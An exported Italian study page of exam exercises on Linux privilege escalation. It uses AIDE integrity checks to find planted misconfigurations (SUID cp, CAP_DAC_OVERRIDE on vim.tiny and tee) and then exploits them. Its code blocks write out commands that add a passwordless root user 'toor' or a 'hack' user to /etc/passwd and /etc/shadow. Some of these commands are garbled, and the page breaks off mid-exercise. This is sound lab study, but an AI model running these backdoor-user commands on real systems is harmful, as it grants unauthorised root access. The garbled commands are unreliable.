<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>ESERCIZI ESAME</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="a93689aa-941e-48cb-b1c4-cea3bfc8a0c9" class="page sans"><header><h1 class="page-title">ESERCIZI ESAME</h1><p class="page-description"></p></header><div class="page-body"><ul id="e166a180-6022-4014-9adf-fb9c369b52df" class="toggle"><li><details open=""><summary>Privilege escalation</summary><ul id="bb5d14b9-ca8a-416a-bda5-4b904ebbc6a3" class="toggle"><li><details open=""><summary>9 gennaio 2023</summary><h3 id="437ea2d3-62b6-49f5-90d9-65d02b8aa83f" class="">Prima parte</h3><p id="185d6c80-f552-43dc-adfc-a5e6282f90ff" class="">Prima di eseguire il comando:<br/><br/><code>sudo ./change1</code><br/>é stato eseguito uno snapshot del sistema quando ancora era pulito grazie all&#x27;utilizzo di AIDE, tool per eseguire integrity checking del sistema. Per farlo, è stata eseguita una modifica del file di configurazione con due sostanziali modifiche:<br/></p><ul id="509e9ecc-644c-45a3-a3dc-8a90c9978acf" class="bulleted-list"><li style="list-style-type:disc">La prima modifica apportata è stata commentare la riga del file di configurazione che portava all&#x27;include di tutte le regole di default di AIDE sotto la cartella /etc/aide/aide.conf.d/</li></ul><ul id="055cdf50-5ebc-4e5c-95c5-4e667be23d35" class="bulleted-list"><li style="list-style-type:disc">La seconda modifica è stata quella di inserire il controllo per tutti i file contenuti all&#x27;interno della cartella /usr/bin/<em>. Questo controllo è stata garantito con la stringa /usr/bin/</em> R -&gt; classe di controllo</li></ul><p id="7a01ef38-b4bc-400a-9d0e-3fc96f796fcb" class="">Successivamente si è eseguito il comando:<br/><br/><code>sudo ./change1</code><br/>E si è controllato il sistema dopo l&#x27;esecuzione di tale comando attraverso:<br/><br/><code>sudo aide -c /etc/aide/aide.conf -C</code><br/>Tale controllo ha evidenziato una differenza di permessi per quanto riguarda il file cp, che ha acquisito il bit SUID. Tale bit permette di eseguire il comando con i privilegi dell&#x27;utente proprietario ovvero root.<br/></p><h3 id="6b83d1f1-d0d8-42d9-9637-d5c9a55d3b3d" class="">Seconda parte</h3><p id="991f3b68-4d81-4cc6-bf5c-f6b8998931d5" class="">I comandi che sono stati eseguiti per la creazione dell&#x27;utente toor con privilegi di root senza l&#x27;inserimento di file sono stati:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e53b1d5e-fb3d-43b0-961c-2f1b8fdabee3" class="code"><code class="language-JavaScript">cp /etc/passwd passwd.modifica
cp /etc/shadow shadow.modifica
echo &quot;toor:x:0:0::/root:/usr/bin/zsh&quot; &gt;&gt; passwd.modifica
echo &quot;toor::19590:0:99999:7:::&quot; &gt;&gt; shadow.modifica
mv passwd.modifica passwd
mv shadow.modifica shadow
cp passwd /etc/
cp shadow /etc/
su - toor</code></pre><p id="e9d02336-2b2c-4b07-a87c-4225cea9c038" class="">Eseguendo il comando id si può osservare che l&#x27;utente appena creato presenta i privilegi di root</p></details></li></ul><ul id="6c249d90-0154-4167-b172-45456e677d68" class="toggle"><li><details open=""><summary>15 giugno 2023</summary><p id="3b6d6231-4488-4588-b392-16b97fd4420e" class="">Il sistema è stato predisposto attraverso l’utilizzo di AIDE, HIDS utilizzato per eseguire integrity checking. All’interno del file di configurazione /etc/aide/aide.conf vengono eseguite due modifiche:</p><ul id="ee8cbb52-ded4-4f1e-803b-d61a41f83f4a" class="bulleted-list"><li style="list-style-type:disc">Viene commentata la riga per l’inclusione dei controlli presenti nella cartella /etc/aide/aide.conf.d/</li></ul><ul id="6cdb7efe-83c9-4eaf-92ae-84fdb8934ac3" class="bulleted-list"><li style="list-style-type:disc">Vengono inseriti i controlli necessari per l’esercizio, ovvero:<ul id="9fd606e9-e125-45e4-ad28-cdf49c81539a" class="bulleted-list"><li style="list-style-type:circle">/usr/bin/* f R</li></ul><ul id="ee9edf7a-764b-4f90-aaf2-d6a50dcdd93a" class="bulleted-list"><li style="list-style-type:circle">/etc/* f R</li></ul></li></ul><p id="70a2746d-2907-4796-8859-0c60c8e9a776" class="">In seguito a tale modifica, viene eseguito il comando:</p><p id="4a48fc1f-6642-45ff-aed1-1ff110a42258" class="">sudo aideinit</p><p id="9a30d698-06a7-43f4-a0c7-6f5d2bbe5381" class="">Tale comando serve per eseguire l’istantanea del mio sistema in assenza di misconfiguration, con la creazione di due differenti db ovvero /var/lib/aide/aide.db e /var/lib/aide/aide.db.new. Dopo questa operazione è possibile eseguire il binario che apporta le modifiche. In seguito si esegue il comando:</p><p id="c4aad70d-8a8b-4cc3-b5f2-96f2fd591b6e" class="">sudo aide -c /etc/aide/aide.conf -C</p><p id="43fa1d12-f4b7-4a30-87ce-66ad0c278bfc" class="">Tale comando confronta il mio sistema con le istantanea /var/lib/aide/aide.db, restituendo all’utente le differenze:</p><figure id="4ee234d4-889a-4488-a76e-e5a0b2b3e4f9" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled.png"><img style="width:384px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled.png"/></a></figure><p id="f5221b85-aed3-44ee-accd-1b569d4eac1f" class="">Si analizzano meglio le modifiche apportate dal binario:</p><ul id="91e7739f-d40c-4834-b7be-0b5402b36b49" class="bulleted-list"><li style="list-style-type:disc">Per quanto riguarda file /etc/passwd e /etc/shadow si può notare che le uniche modifiche apportate riguardano il timestamp. Il fatto che queste modifiche non possano essere sfruttate per eseguire privilege esclation è sottolineato anche eseguendo il comando diff. </li></ul><ul id="3d631832-da1c-4cd9-9819-94264afe5391" class="bulleted-list"><li style="list-style-type:disc">Per quanto riguarda le altre tre modifiche, si analizzano meglio attraverso il seguente comando:<figure id="9b96afdc-f328-4627-8f18-2b2a3f8e6cb6" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%201.png"><img style="width:455px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%201.png"/></a></figure></li></ul><p id="e878efa6-c04c-4cb4-862b-0d1b6ae1f3aa" class="">Grazie all’ouput riportato è possibile vedere che è stato assegnato al’editor vim.tiny la capability CAP_DAC_OVERRIDE=eip che permette di ignorare completamente tutti i permessi sul filesystem. Tale modifica può essere sfruttata per eseguire privilege escalation. Infatti, all’interno del file /etc/passwd si può inserire la entry:</p><p id="112e2bd1-840b-459a-b38c-2b3e7df91b87" class=""><code>toor::0:0:toor:/root:/usr/bin/zsh</code></p><p id="c4de69b8-3e78-42b2-9b04-feb72e470755" class="">mentre all’interno del file /etc/shadow si può inserire la entry:</p><p id="17ca4d7d-de57-481b-9335-8eb5b4c7b72e" class=""><code>toor::19590:0:99999:7:::</code></p><p id="3f906a68-6990-484a-9c64-574c721c7c6f" class="">In questo modo è stato inserito all’interno del sistema un utente con privilegi di root senza password:</p><figure id="6999df3c-d567-4b43-833e-f0595182781a" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%202.png"><img style="width:483px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%202.png"/></a></figure></details></li></ul><ul id="d1370afb-1abf-45c4-be84-526b1fc0a9c1" class="toggle"><li><details open=""><summary>11 gennaio 2024</summary><p id="28a925f3-e041-4177-afef-71fdcb5948e1" class="">Il sistema è stato predisposto attraverso l’utilizzo di AIDE, HIDS utilizzato per eseguire integrity checking. All’interno del file di configurazione /etc/aide/aide.conf vengono eseguite due modifiche:</p><ul id="e3b74620-6d93-47f4-b25d-68a7930a9584" class="bulleted-list"><li style="list-style-type:disc">Viene commentata la riga per l’inclusione dei controlli presenti nella cartella /etc/aide/aide.conf.d/</li></ul><ul id="b9d30adf-5dcd-4acb-8f11-f1152967b00a" class="bulleted-list"><li style="list-style-type:disc">Vengono inseriti i controlli necessari per l’esercizio, ovvero:<ul id="7526a7f8-ff3d-4992-9554-4d1537755b30" class="bulleted-list"><li style="list-style-type:circle">/usr/bin/* R</li></ul><ul id="9ef109a3-8834-4e2d-bd3e-e6be343e73c3" class="bulleted-list"><li style="list-style-type:circle">/etc/* R</li></ul></li></ul><p id="60292516-ab3b-4ba0-bc7d-beab998c4571" class="">In seguito a tale modifica, viene eseguito il comando:</p><p id="dfb3c9b2-a52f-4081-9582-5c77e7b0c2c1" class="">sudo aideinit</p><p id="f94ef34c-462e-474a-909b-1aa7e16e119a" class="">Tale comando serve per eseguire l’istantanea del mio sistema in assenza di misconfiguration, con la creazione di due differenti db ovvero /var/lib/aide/aide.db e /var/lib/aide/aide.db.new. Dopo questa operazione è possibile eseguire il binario che apporta le modifiche. In seguito si esegue il comando:</p><p id="6c657b79-3c85-442d-b589-c9c940932955" class="">sudo aide -c /etc/aide/aide.conf -C</p><p id="8809b61f-0340-4d37-8410-43914b44e14a" class="">Tale comando confronta le istantanea del sistema, restituendo all’utente le differenze:</p><figure id="5ae8cf7c-da74-47cd-9b4c-efbefd40d8fb" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%203.png"><img style="width:432px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%203.png"/></a></figure><p id="f7b450f6-490f-4a5f-959f-5dd2604a68ee" class="">Si analizzano meglio le modifiche apportate dal binario:</p><ul id="e2f8077b-87f7-479a-b45b-4c9a98a13d95" class="bulleted-list"><li style="list-style-type:disc">La modifica riguarda al file /etc/sudoers riguarda il tempo di modifica e di conseguenza non può essere utilizzata per eseguire privilege escalation</li></ul><ul id="fded8366-ce07-4b2b-81d1-707de5f0920b" class="bulleted-list"><li style="list-style-type:disc">Si esegue il comando riportato in figura:<figure id="ef768763-1406-4046-bc3e-8751d12dc971" class="image"><a href="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%204.png"><img style="width:409px" src="ESERCIZI%20ESAME%20a93689aa941e48cbb1c4cea3bfc8a0c9/Untitled%204.png"/></a></figure><p id="58cf7ce6-ef7b-48c5-b6b8-3d25bb4c74c4" class="">Grazie all’ouput riportato è possibile vedere che è stato assegnato al comando tee la capability CAP_DAC_OVERRIDE=eip che permette di ignorare completamente tutti i permessi sul filesystem. Al comando grep non è stata assegnata nessuna capability importantante. </p></li></ul><ul id="c305deb8-e025-48ab-bcc8-3a7ef213e47e" class="bulleted-list"><li style="list-style-type:disc">Per quanto riguarda l’editor vi, è stato rimosso il diritto di scrittura, modifica che non consente privilege escalation</li></ul><p id="369ec898-8318-4257-8184-8f2fda339697" class="">L’unico comando che si può utilizzare per eseguire privilege escalation è il comando tee, che si può utilizzare per ridirigere lo standard input all’interno di un file. I comandi che per la creazione di un utente hack con password hack sono:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1c69fbc4-2776-4dff-b816-bd193f043391" class="code"><code class="language-JavaScript">echo &quot;&quot; | tee -a /etc/passwd
openssl rand -base64 32
eseguo openssl passwd -6 -salt salt= hack
eseguo echo &quot;hack:salt= hack passwd:::::::&quot; | tee -a /etc/shadow</code></pre></details></li></ul><ul id="ce08fdf4-0820-480e-b206-c41714876678" class="toggle"><li><details open=""><summary>8 febbraio 2024</summary><p id="895cbb50-fd7f-4fbd-8054-ea7acfe4a47a" class="">Il sistema è stato predisposto attraverso l’utilizzo di AIDE, HIDS utilizzato per eseguire integrity checking. All’interno del file di configurazione /etc/aide/aide.conf vengono eseguite due modifiche:</p><ul id="7f3cfd44-ac7c-44c6-9c12-84c8a1326f11" class="bulleted-list"><li style="list-style-type:disc">Viene commentata la riga per l’inclusione dei controlli presenti nella cartella /etc/aide/aide.conf.d/</li></ul><ul id="d93d5753-95f0-489b-a52b-fc8e408db9bc" class="bulleted-list"><li style="list-style-type:disc">Vengono inseriti i controlli necessari per l’esercizio, ovvero:<ul id="b92777b7-e201-4024-9375-5fefdf225b98" class="bulleted-list"><li style="list-style-type:circle">/usr/bin/* f R</li></ul><ul id="d406f881-f5ad-40e3-9bd2-4dc1f888e8e2" class="bulleted-list"><li style="list-style-type:circle">/etc/* f R</li></ul></li></ul><p id="1a4d22b2-169e-45fb-b6d0-f0d7f7a7eb55" class="">In seguito a tale modifica, viene eseguito il comando:</p><p id="ba29eabe-d343-4bcf-a5cc-9efa04fd68e6" class="">sudo aideinit</p><p id="4841ca1a-f6ee-4ebc-95ee-4a052522b353" class="">Tale comando serve per eseguire l’istantanea del mio sistema in assenza di misconfiguration, con la creazione di due differenti db ovvero /var/lib/aide/aide.db e /var/lib/aide/aide.db.new. Dopo questa operazione è possibile eseguire il binario che apporta le modifiche. In seguito si esegue il comando:</p><p id="00a8a44c-3d33-44f7-9a81-de64bda87051" 